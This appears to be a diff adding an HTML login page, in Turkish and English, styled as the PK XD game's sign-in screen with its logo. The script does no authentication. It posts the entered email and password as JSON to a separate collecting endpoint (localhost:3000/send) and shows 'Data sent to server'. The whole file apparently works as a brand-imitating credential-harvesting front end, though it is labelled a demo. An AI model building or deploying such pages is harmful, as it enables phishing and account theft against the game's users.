@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login Demo - PK XD Stili</title>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:Arial, Helvetica, sans-serif;
+}
+
+html, body{
+  width:100%;
+  height:100%;
+}
+
+/* Arka plan */
+body{
+  background: linear-gradient(rgba(0,0,0,0.0), rgba(0,0,0,0.0)), 
+              url('images/background.png') no-repeat center center fixed;
+  background-size: cover;
+}
+
+/* ÜST BAR */
+.banner{
+  height:60px;
+  background:rgba(0,0,0,0.25);
+  display:flex;
+  justify-content:flex-end;
+  align-items:center;
+  padding:0 30px;
+}
+
+.lang-btn{
+  background:#ffffff33;
+  border:none;
+  color:white;
+  padding:8px 16px;
+  border-radius:10px;
+  cursor:pointer;
+  transition: 0.3s;
+}
+.lang-btn:hover{
+  background:#ffffff55;
+}
+
+/* LOGIN PANEL */
+.login-panel{
+  width:420px;
+  background: rgba(123,44,226,0.85); /* hafif saydam */
+  margin:60px auto;
+  padding:30px 30px 40px 30px;
+  border-radius:22px;
+  box-shadow:0 25px 50px rgba(0,0,0,.45);
+  backdrop-filter: blur(10px);
+  text-align:center;
+}
+
+.logo-panel{
+  width:120px; /* logo boyutu */
+  margin:0 auto 20px auto;
+}
+
+/* Giriş başlığı (artık logo kullanıyoruz) */
+.logo-panel img{
+  width:100%;
+  object-fit: contain;
+}
+
+/* Inputlar */
+.login-panel input{
+  width:100%;
+  padding:15px;
+  margin-bottom:18px;
+  border:none;
+  border-radius:10px;
+  outline:none;
+  transition: 0.3s;
+  background: rgba(255,255,255,0.05);
+  color:white;
+}
+
+.login-panel input:focus{
+  box-shadow: 0 0 15px #a97cff;
+  background: rgba(255,255,255,0.1);
+}
+
+/* Şifremi unuttum */
+.forgot{
+  text-align:right;
+  color:#33f3ff;
+  margin-bottom:25px;
+  cursor:pointer;
+  transition: 0.3s;
+}
+.forgot:hover{
+  text-decoration:underline;
+}
+
+/* Buton */
+button{
+  width:100%;
+  padding:16px;
+  border:none;
+  border-radius:14px;
+  background:#a97cff;
+  color:white;
+  font-size:16px;
+  font-weight:bold;
+  opacity:.6;
+  cursor:not-allowed;
+  transition: 0.3s;
+}
+
+button.active{
+  opacity:1;
+  cursor:pointer;
+  box-shadow: 0 0 20px #a97cff, 0 0 40px #a97cff;
+}
+
+button.active:hover{
+  box-shadow: 0 0 25px #a97cff, 0 0 50px #a97cff;
+}
+
+/* Sonuç mesajı */
+.result{
+  margin-top:20px;
+  text-align:center;
+  color:white;
+  font-weight:bold;
+}
+</style>
+</head>
+
+<body>
+
+<div class="banner">
+  <button class="lang-btn" id="langBtn">Türkçe</button>
+</div>
+
+<div class="login-panel">
+  <!-- PK XD Logo -->
+  <div class="logo-panel">
+    <img src="images/pkxd_logo.png" alt="PK XD Logo">
+  </div>
+
+  <!-- Inputlar -->
+  <input type="email" id="email" placeholder="E-posta">
+  <input type="password" id="password" placeholder="Şifre">
+  <div class="forgot" id="forgot">Şifreni mi unuttun?</div>
+
+  <button id="loginBtn" disabled>GİRİŞ</button>
+  <div class="result" id="result"></div>
+</div>
+
+<script>
+let currentLang = "tr";
+
+const email = document.getElementById("email");
+const password = document.getElementById("password");
+const loginBtn = document.getElementById("loginBtn");
+const result = document.getElementById("result");
+const langBtn = document.getElementById("langBtn");
+const forgot = document.getElementById("forgot");
+
+function updateLang(){
+  if(currentLang === "tr"){
+    email.placeholder = "E-posta";
+    password.placeholder = "Şifre";
+    loginBtn.textContent = "GİRİŞ";
+    forgot.textContent = "Şifreni mi unuttun?";
+    langBtn.textContent = "Türkçe";
+  }else{
+    email.placeholder = "Registered email";
+    password.placeholder = "Password";
+    loginBtn.textContent = "LOGIN";
+    forgot.textContent = "Forgot password";
+    langBtn.textContent = "English";
+  }
+}
+
+langBtn.addEventListener("click",()=>{
+  currentLang = currentLang === "tr" ? "en" : "tr";
+  updateLang();
+});
+
+function checkInputs(){
+  if(email.value && password.value){
+    loginBtn.classList.add("active");
+    loginBtn.disabled = false;
+  }else{
+    loginBtn.classList.remove("active");
+    loginBtn.disabled = true;
+  }
+}
+
+email.addEventListener("input",checkInputs);
+password.addEventListener("input",checkInputs);
+
+loginBtn.addEventListener("click", async ()=>{
+  if(!loginBtn.classList.contains("active")) return;
+
+  const res = await fetch("http://localhost:3000/send",{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body: JSON.stringify({
+      email: email.value,
+      password: password.value
+    })
+  });
+
+  if(res.ok){
+    result.textContent = currentLang === "tr"
+      ? "Veriler sunucuya gönderildi ✅"
+      : "Data sent to server ✅";
+  }else{
+    result.textContent = "Sunucu hatası ❌";
+  }
+});
+
+updateLang();
+</script>
+
+</body>
+</html>
